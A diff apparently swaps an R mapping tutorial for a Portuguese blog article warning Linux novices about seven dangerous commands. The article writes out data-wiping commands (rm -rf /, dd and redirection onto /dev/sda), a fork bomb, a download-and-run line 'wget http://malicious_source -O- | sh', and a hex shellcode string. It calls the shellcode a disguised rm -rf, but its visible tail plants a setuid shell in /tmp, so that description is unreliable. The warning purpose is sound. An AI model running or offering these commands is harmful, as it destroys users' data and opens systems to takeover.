@@ -12,180 +12,62 @@ featured_image: /images/linux/7-comand-danger.png
 
 
 
-Last week all the _rstatsosphere_ see the beautiful 
-[Timo Grossenbacher](timogrossenbacher.ch)
-[work](timogrossenbacher.ch/2016/12/beautiful-thematic-maps-with-ggplot2-only/).
+## 7 comandos perigosos do Linux que você NUNCA deve executar  ##
 
-The last month, yep, the past year I've working on create maps
-easily with [highcharter](http://jkunst.com/highcharter/).
-When I saw this chart I took as  challege to replicate this nice
- map in using highcharter:
+Como o número de usuários leigos de Linux vem aumentando com o tempo, acho pertinente alertar as pessoas sobre alguns comandos que podem ser perigosos, tanto para o sistema, quanto para os dados contidos no computador. 
 
-![](/images/featured-image/thematic-interactive-map.gif "Thematic intercative map")
+Como o número de usuários leigos de Linux vem aumentando com o tempo, acho pertinente alertar as pessoas sobre alguns comandos que podem ser perigosos, tanto para o sistema, quanto para os dados contidos no computador.
 
-So...
+O terminal é uma ferramenta muito poderosa, por conta disso é bom você dominá-lo, ou pelo menos entendê-lo, para evitar problemas no seu sistema baseado em Linux.
+ Os grandes problemas que você pode enfrentar usando o terminal de forma indiscriminada normalmente estão atrelados a comandos de sobrescrita de dados, então vamos mostrar alguns aqui que você deve prestar especial atenção quando vir alguém sugerindo que você faça no seu computador com Linux.
 
+Atenção: Você NÃO deve executar nenhum destes comandos no seu computador, isso pode causar danos irreversíveis que nós não nos responsabilizamos, o artigo tem a intenção de ser instrutivo, justamente para evitar este tipo de situação.
 
+1 - ```rm -rf```
 
-![giphy gif](https://media.giphy.com/media/eNweOH3UEi33a/giphy.gif) [source](http://wifflegif.com)
+É um comando clássico do do Linux que teoricamente não faz nada de mais, ele serve apenas para apagar arquivos, e é aí que mora o perigo. Dependendo da forma que ele for aplicativo o resultado pode ser muito desagradável, por isso é importante você entender o que os comandos fazem, vamos explicar um pouco melhor neste exemplo:
+- rm: comando usado no Linux para deletar arquivos.
+- rm -r: o comando deleta pastas recursivamente, mesmo que a pastas esteja vazia.
+- rm -f: cUsando este parâmetro, o propriedade de "apenas leitura" que um arquivo tenha é removida sem perguntar, permitindo que o arquivo seja apagado.
+- rm -rf / : Usando a combinação dos dois parâmetros com a "/" você diz para o sistema apagar tudo que está no diretório raiz do sistema.
+- rm -rf * : Força o apagamento de tudo que está no diretório atual ou no de trabalho, dependendo de onde você estiver.
+- rm -rf . : Acrescentando um ponto, você pode apagar também as pastas ocultas, além das normais.
 
-> Challenge accepted. it's gonna be legen...
-> -- <cite>Me.</cite>
+Tome muito cuidado ao executar um comando destes, especialmente se for feito como root ou usando o sudo.
 
+ Tão perigoso que pode ser este comando, que atualmente o Linux se protege contra ele, se você rodá-lo, mesmo com sudo ou como root, ele não vai funcionar, para isso é preciso usar os parâmetros descritos na imagem acima. Da mesma forma que o Linux protege você de destruir o sistema sem querer, ele também permite que você o destrua mediante a ter certeza de que é realmente isso que você quer, curioso, não é?
 
-```r
-# packages ----------------------------------------------------------------
-library(dplyr)
-library(rmapshaper)
-library(maptools)
-library(highcharter)
-library(geojsonio)
-library(readr)
-library(viridis)
-library(purrr)
-```
+2 - ```:(){:|:&};:```
 
-## Data
+Este comando funciona como uma "Fork Bomb", ele opera definindo uma função chamada ':', que se chama duas vezes, uma vez em primeiro plano e outra em segundo plano, o processo se repete indefinidamente até que o sistema trave.
 
-The data used fhor this chart is the same using by Timo. But the workflow
-was slightly modified:
+3 - qualquer comando para > /dev/sda
 
-1. Read the shapefile with `maptools::readShapeSpatial`.
-2. Simplify the shapefile (optional step) using `rmapshaper::ms_simplify`.
-3. Then transform the map data to geojson using `geojsonio::geojson_list`.
+A forma com que o Linux lê as partições e discos é diferente do Windows, por conta disso, normalmente novatos não conseguem entender em primeira instância como eles são distribuídos. Normalmente a localização dos dispositivos de armazenamento do sistema ficam dentro de /dev, sendo que podem haver vários por ali e normalmente o sda está presente.
 
+O problema do comando acima é que ele redireciona a saída de qualquer comando que seja colocado para o seu bloco de armazenamento, desta foma sobrescrevendo alguns dados e corrompendo outros.
 
+4 - ```mv pasta/diretório /dev/null```
 
+Eu costumava brincar sobre o /dev/null me referindo a ele como o "buraco negro" do Linux. Tudo que é enviado para ele é perdido "para sempre". Então tome cuidado ao mover qualquer coisa para esta localização. O comando mv serve para mover arquivos ou diretórios para o destino indicado, se este destino for o /dev/null você estará mandando seus arquivos pra Nárnia.
 
-```r
-# data --------------------------------------------------------------------
-folder <- "data/thematicmap/"
+5 - ```wget http://malicious_source -O- | sh```
 
-map <- readShapeSpatial(file.path(folder, "gde-1-1-15.shp"))
-map <- ms_simplify(map, keep = 1) # because ms_simplify fix the Ã¼'s
-map <- geojson_list(map)
+Este comando vai aparecer para você instalar alguns programas. O wget é o programa responsável por fazer o download da URL que vem logo após, ele é bem útil para baixar arquivos em geral, o problema está no arquivo que ele baixa e na sequência do comando  que o executa no caso dele ser um shell script. Só baixe arquivos desta forma de fontes que você considera confiáveis e se estiver na dúvida, baixe apenas o arquivo de shell, eliminando qualquer parâmetro que apareça após o link, assim você pode abrir ele em um editor de texto de sua preferência e verificar o que há dentro dele.
 
-str(map, max.level = 1)
-```
+6 - ```dd if=/dev/random of=/dev/sda```
 
-```
-## List of 2
-##  $ type    : chr "FeatureCollection"
-##  $ features:List of 2324
-##   .. [list output truncated]
-##  - attr(*, "class")= chr "geo_list"
-##  - attr(*, "from")= chr "SpatialPolygonsDataFrame"
-```
+Assim como o ítem 3 da nossa lista, o grande problema aqui é o destino ser o /dev/sda. Tome cuidado. O comando dd pode ser muito útil para copiar arquivos e até mesmo partições inteiras, como no exemplo 6, mas se a saída for um outro disco, tome cuidado, pois o resultado irá sobrepor os dados lá existentes.
 
-```r
-str(map$features[[7]], max.level = 5)
-```
+7 - Comandos disfarçados
 
-```
-## List of 4
-##  $ type      : chr "Feature"
-##  $ id        : int 6
-##  $ properties:List of 3
-##   ..$ Secondary_  : chr "Knonau"
-##   ..$ BFS_ID      : int 7
-##   ..$ rmapshaperid: int 6
-##  $ geometry  :List of 2
-##   ..$ type       : chr "MultiPolygon"
-##   ..$ coordinates:List of 1
-##   .. ..$ :List of 1
-##   .. .. ..$ :List of 7
-##   .. .. .. ..$ : num [1:2] 676327 230767
-##   .. .. .. ..$ : num [1:2] 675655 233007
-##   .. .. .. ..$ : num [1:2] 676458 233252
-##   .. .. .. ..$ : num [1:2] 679285 230257
-##   .. .. .. ..$ : num [1:2] 679590 229402
-##   .. .. .. ..$ : num [1:2] 678887 229152
-##   .. .. .. ..$ : num [1:2] 676327 230767
-```
+Como eu comentei à princípio, o terminal é uma ferramenta poderosa, se você não dominá-lo, é bom ter cuidado com que você for rodar nele, se o você não fala a língua do terminal, saiba que ele fala muitas outras. O comando abaixo nada mais é do que o comando indicado no primeiro item da nossa lista, só que em forma hexadecimal.
 
-```r
-# this was to put the name on the tooltip
-map$features <- map(map$features, function(x) {
-  x$properties$name <- x$properties[["Secondary_"]] 
-  x
-})
-
-data <- read_csv(file.path(folder, "avg_age_15.csv"))
-data <- select(data, -X1)
-data <- rename(data, value = avg_age_15)
-
-# colors
-no_classes <- 6
-
-colors <- magma(no_classes + 2) %>% 
-  rev() %>% 
-  head(-1) %>% 
-  tail(-1) %>% 
-  gsub("FF$", "", .)
-
-# brks <- quantile(data$value, probs = seq(0, 1, length.out = no_classes + 1))
-brks <- c(min(data$value), c(40,42,44,46,48), max(data$value))
-brks <- ifelse(1:(no_classes + 1) < no_classes, floor(brks), ceiling(brks))
-```
-
-## Map
-
-Create the raw map is straightforward. The _main_ challege was replicate the 
-relief feature of the orignal map. This took _some days_ to figure
-how add the backgound image. I almost loose the hope but you know, new year,
-so I tried a little more and it was possible :):
-
-1. First I searched a way to transform the tif image to geojson. I wrote
-a mail [@frzambra](https://twitter.com/frzambra) a geoRexpert :D. and
-he kindly said me that I was wrong. And he was right. NEXT!
-2. I tried with use `divBackgroundImage` but with this the image use all the
-container... so... NEXT.
-3. Finally surfing in the web I met `plotBackgroundImage` argument in highcharts
-which is uesd to put and image only in plot container (inside de axis) and 
-it works nicely. It was necessary hack the image using the `preserveAspectRatio`
-(html world) to center the image but nothing magical. 
+    char esp[] __attribute__ ((section(“.text”))) /* e.s.p release */ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″ “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″ “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″ “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″ “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″ “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″ “\x6e\x2f\x73\x68\x00\x2d\x63\x00″ “cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;
 
 
+Ele tem o mesmo propósito do famigerado "rm -rf /", por isso, não rode coisas no terminal que você não sabe para quem servem, existem muito conteúdo grátis a internet para você estudar sobre e até mesmo alguns bons cursos pagos, como é o caso do "Dominando o Terminal" aqui do blog mesmo, mas em linhas gerais, se você evitar colocar comandos que você não sabe para que servem direito, os problemas já serão minimizados. 
 
+Agora espalhe este conhecimento para ajudar mais pessoas a ficarem precavidas sobre estes pequenos percalços da vida computacional.
 
-```r
-urlimage <- "https://raw.githubusercontent.com/jbkunst/r-posts/master/061-beautiful-thematic-maps-with-ggplot2-highcharter-version/02-relief-georef-clipped-resampled.jpg"
-
-highchart(type = "map") %>% 
-  # data part
-  hc_add_series(mapData = map, data = data, type = "map",
-                joinBy = c("BFS_ID", "bfs_id"), value = "value",
-                borderWidth = 0) %>% 
-  hc_colorAxis(dataClasses = color_classes(brks, colors)) %>% 
-  # functionality
-  hc_tooltip(headerFormat = "",
-             pointFormat = "{point.name}: {point.value}",
-             valueDecimals = 2) %>% 
-  hc_legend(align = "right", verticalAlign = "bottom", layout = "vertical",
-            floating = TRUE) %>%
-  hc_mapNavigation(enabled = FALSE) %>% # if TRUE to zoom the relief image dont zoom.
-  # info
-  hc_title(text = "Switzerland's regional demographics") %>% 
-  hc_subtitle(text = "Average age in Swiss municipalities, 2015") %>% 
-  hc_credits(enabled = TRUE,
-             text = "Map CC-BY-SA; Author: Joshua Kunst (@jbkunst) based mostly on Timo Grossenbacher (@grssnbchr) work, Geometries: ThemaKart, BFS; Data: BFS, 2016; Relief: swisstopo, 2016") %>% 
-  # style
-  hc_chart(plotBackgroundImage = urlimage,
-           backgroundColor = "transparent",
-           events = list(
-             load = JS("function(){ $(\"image\")[0].setAttribute('preserveAspectRatio', 'xMidYMid') }")
-           ))
-```
-
-<iframe src="/htmlwidgets/thematic-interactive-map/highchart_ufzvsmh.html"></iframe> <a href="/htmlwidgets/thematic-interactive-map/highchart_ufzvsmh.html" target="_blank">open</a>
-
-> DARY! Legendary.
-> -- <cite>Me.</cite>
-
-Same as the original/ggplot2 version. I'm very happy with the result.
-But anyway, there are some details:
-
-1. The image/relief need to be accesible in web. I don't know how
-to add images as dependencies yet. I tried econding the image but didn't work.
-2. I could not do the legend same as the original. So I used `dataClasses`
-instead of `stops` in `hc_colorAxis`.
+Fonte; https://www.diolinux.com.br/2017/01/7-comandos-mais-perigosos-linux.html
